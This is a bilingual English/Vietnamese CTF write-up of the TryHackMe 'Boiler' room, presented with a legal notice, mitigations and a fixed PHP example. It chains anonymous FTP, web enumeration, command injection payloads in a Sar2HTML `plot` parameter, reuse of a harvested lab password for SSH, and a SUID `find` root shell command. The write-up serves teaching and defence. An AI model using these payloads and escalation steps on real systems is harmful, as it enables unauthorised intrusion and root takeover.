
# Boiler — TryHackMe (Sar2HTML RCE → SUID `find` → Root)  

> **Target:** `10.10.140.202` (example IP used in original write-up).  
> *(Mục tiêu: `10.10.140.202` (IP ví dụ theo write-up gốc).)*

---

## Overview (Tổng quan)  
This writeup covers a full exploitation chain: anonymous FTP → web enumeration → command injection in a Sar2HTML demo (`plot` parameter) → credential harvesting → SSH access → local privilege escalation via SUID `find`.  
*(Bài viết trình bày chuỗi khai thác: FTP anonymous → liệt kê web → command injection trên demo Sar2HTML (tham số `plot`) → lấy mật khẩu → SSH → leo quyền cục bộ bằng SUID `find`.)*

**Legal notice:** only perform these steps in labs/CTF environments or systems you are authorized to test.  

---

## Table of Contents (Mục lục)
- Reconnaissance (Thu thập thông tin)  
- Initial foothold (Bước vào hệ thống)  
- Command injection on Sar2HTML (Lỗi command injection trên Sar2HTML)  
- Credential harvesting and SSH (Lấy mật khẩu và SSH)  
- Privilege escalation to root (Leo quyền lên root)  
- Mitigations (Phòng ngừa)  
- References (Tài liệu tham khảo)  
*(Mục lục: Thu thập thông tin → Bước vào hệ thống → Lỗi command injection trên Sar2HTML → Lấy mật khẩu & SSH → Leo quyền → Phòng ngừa → Tài liệu tham khảo)*

---

## Reconnaissance (Thu thập thông tin)

**Nmap scan** (quick service discovery) — example command:  
*(Quét nmap — lệnh ví dụ):*
```bash
nmap -sC -sV -Pn -p21,80,10000,55007 10.10.140.202
```

**Key results** (Kết quả chính):  
- `21/tcp` — `vsftpd 3.0.3` (anonymous FTP allowed).  
  *(FTP anonymous được cho phép.)*  
- `80/tcp` — `Apache/2.4.18` (web server).  
  *(Web server Apache chạy.)*  
- `10000/tcp` — `MiniServ` (Webmin).  
  *(Có Webmin.)*  
- `55007/tcp` — `OpenSSH` running on nonstandard port.  
  *(SSH chạy ở cổng tuỳ chỉnh.)*

Why this matters: anonymous FTP often exposes files (hints/backups). Web services require directory enumeration to locate hidden/demo pages.  
*(Tại sao quan trọng: FTP anonymous thường lộ file hint/backup; cần enum web để tìm trang demo/ẩn.)*

---

## Initial foothold (Bước vào hệ thống)

### 1. FTP — anonymous login (FTP anonymous)
Connect and fetch files:
*(Kết nối FTP và tải file:)*
```bash
ftp 10.10.140.202
# username: anonymous
# password: any email
ls
get .info.txt
bye

cat .info.txt
```
`.info.txt` contains ROT13 text:
`Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!`  
Decoded with ROT13 → `Just wanted to see if you find it. Lol. Remember: Enumeration is the key!`  
*(File chứa ROT13 → giải được: “Enumeration is the key!” — hint tiếp tục enum.)*

### 2. Web enumeration (Liệt kê web)
Use `gobuster` / `dirb` to find directories:
*(Dùng gobuster/dirb để dò thư mục:)*
```bash
gobuster dir -u http://10.10.140.202 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 20
```
Findings: `/joomla/`, `/joomla/_files/`, `/joomla/_test/` and `robots.txt`.  
*(Kết quả: thấy /joomla/, /joomla/_files/, /joomla/_test/ và robots.txt.)*  
`/joomla/_files/` contains double-base64 blobs (rabbit holes). `/joomla/_test/` hosts a Sar2HTML demo — **target**.  
*(`/joomla/_files/` là rabbit-hole; `/joomla/_test/` là demo Sar2HTML — mục tiêu.)*

---

## Command injection on Sar2HTML (Lỗi command injection trên Sar2HTML)

### Vulnerable behavior (Hành vi dễ bị tấn công)
The demo page calls a CLI tool (sar2html) with a user-controlled parameter `plot`. The server concatenates `plot` into a shell command without sanitization, e.g. (pseudo-PHP):
*(Trang demo gọi CLI sar2html với tham số `plot` từ user, và nối trực tiếp vào lệnh shell — ví dụ pseudo-PHP):*
```php
$plot = $_GET['plot'];
$cmd  = "sar2html --plot " . $plot;
$output = shell_exec($cmd);
echo $output;
```
If `plot` contains shell metacharacters (e.g. `;`, `|`, `$()`), an attacker can inject and run arbitrary commands.  
*(Nếu `plot` chứa ký tự meta shell, attacker có thể chèn và chạy lệnh tùy ý.)*

### Proof of concept (PoC) — test RCE
Confirm injection:
*(Xác nhận RCE:)*  
```
http://10.10.140.202/joomla/_test/index.php?plot=;id
```
The page returns the output of `id` (e.g. `uid=33(www-data) gid=33(www-data) ...`), confirming remote command execution.  
*(Trang trả về output của `id`, xác nhận RCE.)*

### Further exploration: find and read files
List files:
*(Liệt kê file trong working directory):*
```
http://10.10.140.202/joomla/_test/index.php?plot=;ls
```
Read discovered file:
*(Đọc file tìm thấy):*
```
http://10.10.140.202/joomla/_test/index.php?plot=;cat log.txt
```
`log.txt` contains credentials (e.g. `basterd:superduperp@$$`).  
*(`log.txt` chứa mật khẩu ví dụ.)*

**Root cause:** unescaped user input concatenated into shell commands → **Command Injection (RCE)**.  
*(Nguyên nhân: input không escape nhưng nối vào lệnh shell → Command Injection.)*

---

## Credential harvesting and SSH (Lấy mật khẩu và SSH)

Use discovered credentials to SSH into host (note non-standard port):  
*(Dùng creds SSH vào host):*
```bash
ssh basterd@10.10.140.202 -p 55007
# password: superduperp@$$
```
Inside `basterd`'s home, there is `backup.sh` (or similar) containing another password for `stoner`. Switch user:
*(Trong home tìm backup.sh chứa mật khẩu user khác, rồi chuyển user):*
```bash
cat backup.sh
su stoner
# provide password
```
This yields the user flag and a better vantage point for local enumeration.  
*(Nhận flag user và vị trí tốt để dò leo tiếp.)*

---

## Privilege escalation to root (Leo quyền)

### SUID enumeration (Liệt kê SUID)
Search for SUID binaries:
*(Tìm binary có SUID):*
```bash
find / -perm -u=s -type f 2>/dev/null
```
If `/usr/bin/find` is SUID, it can be abused.  
*(Nếu `/usr/bin/find` có SUID, có thể lợi dụng.)*

### Abuse `find` SUID (GTFOBins technique)
GTFOBins documents an abuse technique. Example to spawn a root shell:
*(Recipe từ GTFOBins — sinh root shell nếu `find` SUID):*
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```
`-exec /bin/sh -p \;` runs a shell with preserved privileges; because `find` ran with SUID root, the spawned shell inherits elevated privileges → root.  
*(Lệnh trên sẽ spawn shell với đặc quyền, dẫn tới root shell.)*

Finally, read the root flag:
*(Cuối cùng đọc root flag):*
```bash
whoami    # => root
cat /root/root.txt
```

---

## Mitigations (Phòng ngừa)

**For developers (Dev):**  
*(Dành cho dev:)*
- Avoid concatenating user input into shell commands — use argument-based APIs or libraries that accept argument arrays.  
  *(Tránh nối input người dùng vào shell.)*  
- Whitelist allowed values for parameters (preferred).  
  *(Whitelist giá trị cho phép.)*  
- If shell invocation is unavoidable, escape inputs (`escapeshellarg()` in PHP) and sanitize output before display.  
  *(Nếu phải dùng shell, escape input & sanitize output.)*  
- Don't store credentials in plaintext or in web-accessible logs.  
  *(Không lưu mật khẩu plaintext trong file web-accessible.)*

**For operators (Ops / Admins):**  
*(Dành cho admin:)*
- Remove unnecessary SUID bits and audit SUID binaries regularly.  
  *(Gỡ và audit SUID.)*  
- Remove demo/test pages from production (`_test/`) and apply least privilege for service accounts.  
  *(Loại bỏ trang demo khỏi production, áp dụng least privilege.)*  
- Use WAF/monitoring to detect suspicious inputs that contain shell metacharacters.  
  *(Dùng WAF/giám sát.)*

---

## Example fixes (PHP) — Vulnerable vs Fixed (Ví dụ sửa)

**Vulnerable pseudo-code (bad):**  
*(Mã dễ bị tấn công):*
```php
$plot = $_GET['plot'];
$cmd = "sar2html --plot " . $plot;
$output = shell_exec($cmd);
echo $output;
```

**Fixed: whitelist approach (good):**  
*(Sửa: whitelist — tốt hơn):*
```php
$allowed = ['cpu','memory','io','network'];
$plot = $_GET['plot'] ?? '';
if (!in_array($plot, $allowed, true)) {
    http_response_code(400);
    exit('Invalid plot parameter');
}
$cmd = escapeshellcmd("sar2html --plot " . $plot);
$output = shell_exec($cmd);
echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
```
*(Whitelist là cách an toàn nhất. Nếu vẫn phải chạy shell, escape và sanitize output.)*

---

## References (Tài liệu tham khảo)
- Original walkthrough: HackingArticles — “Boiler CTF — TryHackMe walkthrough”. *(Bài gốc trên HackingArticles.)*  
- GTFOBins — technique for abusing SUID `find`. *(GTFOBins — kỹ thuật lợi dụng `find` SUID.)*

---

## Final notes (Ghi chú kết)
Flow summary: enumeration → RCE via Sar2HTML `plot` parameter → credential harvesting → SSH → SUID `find` abuse → root. Core lesson: **never trust user input** and **avoid shelling out with unsanitized data**.  
*(Tóm tắt: enum → RCE qua `plot` Sar2HTML → lấy mật khẩu → SSH → lợi dụng SUID `find` → root. Bài học: đừng tin input người dùng; tránh gọi shell với dữ liệu chưa sanitize.)*

